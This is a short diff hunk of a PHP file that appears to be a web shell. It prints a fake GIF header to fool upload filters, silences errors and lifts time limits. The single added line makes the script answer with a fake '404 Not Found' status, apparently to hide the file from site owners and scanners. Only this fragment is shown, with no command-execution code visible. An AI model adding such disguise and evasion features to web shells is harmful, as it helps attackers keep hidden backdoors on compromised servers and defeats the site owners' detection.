@@ -5,6 +5,7 @@ echo "<!-- GIF89;a -->\n";
 @ini_set('max_execution_time', 0);
 @error_reporting(0);
 @set_time_limit(0);
+@header('HTTP/1.1 404 Not Found', true, 404);
 @ob_clean();
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
